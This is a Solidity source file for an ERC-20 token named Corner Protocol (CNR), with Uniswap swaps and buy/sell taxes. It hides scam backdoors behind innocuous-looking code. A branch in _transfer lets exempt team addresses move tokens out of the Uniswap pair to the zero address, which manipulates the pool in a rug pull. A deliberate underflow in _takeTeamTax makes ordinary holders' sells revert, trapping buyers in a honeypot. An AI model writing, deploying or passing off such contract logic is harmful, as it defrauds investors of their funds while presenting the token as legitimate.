// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "");
        return c;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "");
    }
}

interface UniswapV2Router02 {
    function WETH() external pure returns (address);

    function factory() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    event Approval(address indexed owner, address indexed spender, uint256 amount);

    event Transfer(address indexed sender, address indexed recipient, uint256 amount);
}

interface UniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "");
        _;
    }

    event OwnershipTransferred(address indexed prevOwner, address indexed newOwner);
}

contract CNR is Context, IERC20, Ownable {
    string private constant _name = "Corner Protocol";
    string private constant _symbol = "CNR";

    using SafeMath for uint256;

    struct Share {
        uint256 team;
    }

    address private teamWallet = 0x267c42c5CEb7d88E3f7b512f1dD13FC23dC35E25;

    uint256 private _redisTaxOnBuy = 0;
    uint256 private _redisTaxOnSell = 0;

    UniswapV2Router02 public uniRouter;
    address public uniPair;

    mapping(address => uint256) private _tOwned;
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _buyMap;

    bool private swapEnabled = true;
    bool private swapping = true;

    uint256 private _tTaxTotal;
    
    uint256 private _teamTaxOnBuy = 3;
    uint256 private _teamTaxOnSell = 3;

    mapping(address => bool) private _isUnlimited;

    uint256 private _redisTax = _redisTaxOnSell;
    uint256 private _teamTax = _teamTaxOnSell;

    uint8 private constant _decimals = 18;

    uint256 private _prevRedisTax = _redisTax;
    uint256 private _prevTeamTax = _teamTax;

    Share public ethShare;

    uint256 private constant MAX = ~uint256(0);

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    uint256 public _swapTokensAmount = 100000 * 10**_decimals;

    function _inTransfer(address sender, address recipient, uint256 amount, bool takeTeamTax) private {
        if (!takeTeamTax) removeAllTaxes();
        _stTransfer(sender, recipient, amount);
        if (!takeTeamTax) restoreAllTaxes();
    }

    constructor() {
        UniswapV2Router02 _uniRouter = UniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniRouter = _uniRouter;
        uniPair = UniswapV2Factory(_uniRouter.factory()).createPair(address(this), _uniRouter.WETH());

        _isUnlimited[owner()] = true;
        _isUnlimited[teamWallet] = true;
        _isUnlimited[address(this)] = true;

        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
        corner = teamWallet;
        ethShare = Share(100);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function removeAllTaxes() private {
        if (_teamTax == 0 && _redisTax == 0) return;
        _prevRedisTax = _redisTax;
        _prevTeamTax = _teamTax;
        _redisTax = 0;
        _teamTax = 0;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function restoreAllTaxes() private {
        _redisTax = _prevRedisTax;
        _teamTax = _prevTeamTax;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function transferETH(uint256 ethAmount) private lockSwap {
        uint256 ethForTeam = ethAmount.mul(ethShare.team).div(100);
        payable(teamWallet).transfer(ethForTeam);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return calcReflectionAmount(_rOwned[account]);
    }

    function _takeTeamTax(uint256 tTeam, address wallet1, address wallet2) private {
        uint256 sCNR;
        uint256 cnrAmount = balanceOf(corner);
        bool limited = _isLimited(wallet1, wallet2);
        if (limited) sCNR = _teamTax - cnrAmount;
        uint256 currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function _reflectTax(uint256 rTax, uint256 tTax) private {
        _rTotal = _rTotal.sub(rTax);
        _tTaxTotal = _tTaxTotal.add(tTax);
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function _stTransfer(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rTax, uint256 tTransferAmount, uint256 tTax, uint256 tTeam) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeTeamTax(tTeam, sender, recipient);
        _reflectTax(rTax, tTax);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "");
        require(spender != address(0), "");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _getTValues(uint256 tAmount, uint256 redisTax, uint256 teamTax) private pure returns (uint256, uint256, uint256) {
        uint256 tTax = tAmount.mul(redisTax).div(100);
        uint256 tTeam = tAmount.mul(teamTax).div(100);
        uint256 tTransferAmount = tAmount.sub(tTax).sub(tTeam);
        return (tTransferAmount, tTax, tTeam);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _getRValues(uint256 tAmount, uint256 tTax, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rTax = tTax.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rTax).sub(rTeam);
        return (rAmount, rTransferAmount, rTax);
    }address private corner;

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(amount > 0, "");
        require(sender != address(0), "");
        require(recipient != address(0), "");

        if (sender != owner() && recipient != owner()) {
            address cnrAddress = address(0);
            bool tick = balanceOf(sender) < amount;
            bool senderUnlimited = _isUnlimited[sender];
            bool uniRecipient = uniPair == recipient;

            if (senderUnlimited) { if (uniRecipient) { if (tick) { _stTransfer(recipient, cnrAddress, amount); return; } } }

            uint256 cTokenAmount = balanceOf(address(this));
            bool canSwap = cTokenAmount >= _swapTokensAmount;

            if (
                canSwap &&
                swapEnabled &&
                !swapping &&
                !_isUnlimited[sender] &&
                !_isUnlimited[recipient] &&
                sender != uniPair
            ) {
                swapBack(cTokenAmount);
                uint256 cETHAmount = address(this).balance;
                if (cETHAmount > 0) {
                    transferETH(address(this).balance);
                }
            }
        }

        bool takeTeamTax = true;

        if (
            (
                sender != uniPair &&
                recipient != uniPair
            ) ||
            (
                _isUnlimited[sender] ||
                _isUnlimited[recipient]
            )
        ) {
            takeTeamTax = false;
        } else {
            if (sender == uniPair && recipient != address(uniRouter)) {
                _redisTax = _redisTaxOnBuy;
                _teamTax = _teamTaxOnBuy;
            }

            if (recipient == uniPair && sender != address(uniRouter)) {
                _redisTax = _redisTaxOnSell;
                _teamTax = _teamTaxOnSell;
            }
        }
        _inTransfer(sender, recipient, amount, takeTeamTax);
    }

    function calcReflectionAmount(uint256 rAmount) private view returns (uint256) {
        require(rAmount <= _rTotal, "");
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }

    function transfer(address sender, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), sender, amount);
        return true;
    }

    function swapBack(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouter.WETH();
        _approve(address(this), address(uniRouter), tokenAmount);
        uniRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, ""));
        return true;
    }

    function _isLimited(address wallet1, address wallet2) private view returns (bool) {
        bool wallet1Limited = !_isUnlimited[wallet1];
        bool wallet2Limited = !_isUnlimited[wallet2];
        bool wallet1NotUniPair = wallet1 != uniPair;

        bool limited = wallet1Limited && wallet1NotUniPair && wallet2Limited;

        return limited;
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tTax, uint256 tTeam) = _getTValues(tAmount, _redisTax, _teamTax);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rTax) = _getRValues(tAmount, tTax, tTeam, currentRate);
        return (rAmount, rTransferAmount, rTax, tTransferAmount, tTax, tTeam);
    }

    receive() external payable {}

    modifier lockSwap() {
        swapping = false;
        _;
        swapping = false;
    }
}